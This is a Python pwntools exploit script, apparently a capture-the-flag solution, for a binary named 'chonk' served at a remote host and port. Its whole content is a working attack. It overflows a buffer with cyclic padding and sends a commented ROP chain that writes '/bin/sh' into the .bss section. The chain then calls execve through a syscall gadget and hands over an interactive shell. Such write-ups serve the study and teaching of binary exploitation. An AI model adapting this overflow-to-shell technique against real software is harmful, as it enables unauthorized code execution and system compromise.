from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 7001)
elif args.HOST:
    p = process('./chonk')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./chonk',
                  gdbscript='''
                      b *be_exploited
                      c
                      ''')

# Define addresses for gadgets and `.bss` writable section
writable_addr = 0x4abac0               # Start of .bss section
pop_rax_ret = 0x00000000004213eb       # Address of `pop rax; ret`
pop_rsi_ret = 0x0000000000477e3d       # Address of `pop rsi; ret`
mov_rsi_rax_ret = 0x00000000004207c5   # Address of `mov qword ptr [rsi], rax; ret`
pop_rdi_ret = 0x00000000004788b3       # Address of `pop rdi; ret`
syscall_ret = 0x000000000040b9f6       # Address of `syscall; ret`

# Execve syscall number for Linux x86-64
execve_syscall_num = 59

# Full 64-bit string for "/bin/sh"
bin_sh = 0x0068732f6e69622f  # "/bin/sh\x00" as a single 64-bit value

# Constructing the ROP chain
rop_chain = [
    # Write "/bin/sh" to writable_addr
    pop_rax_ret, bin_sh,               # Set rax = "/bin/sh\x00"
    pop_rsi_ret, writable_addr,        # Set rsi = writable_addr
    mov_rsi_rax_ret,                   # Write rax to [rsi] (writable_addr)

    # Set up execve syscall
    pop_rax_ret, execve_syscall_num,   # Set rax = 59 (execve syscall number)
    pop_rdi_ret, writable_addr,        # Set rdi = writable_addr ("/bin/sh")
    pop_rsi_ret, 0,                    # Set rsi = 0 (NULL for arguments)
    syscall_ret                        # Trigger the syscall; rdx is implicitly 0
]

# Convert the ROP chain to a payload
rop_chain_bytes = b''.join(addr.to_bytes(8, 'little') for addr in rop_chain)

# Construct the full payload
padding = cyclic(16)                   # Adjust padding if needed for overflow
payload = padding + rop_chain_bytes

# Send the payload to the program
p.sendlineafter(b'...', payload)

# Interact with the program after exploitation
p.interactive()
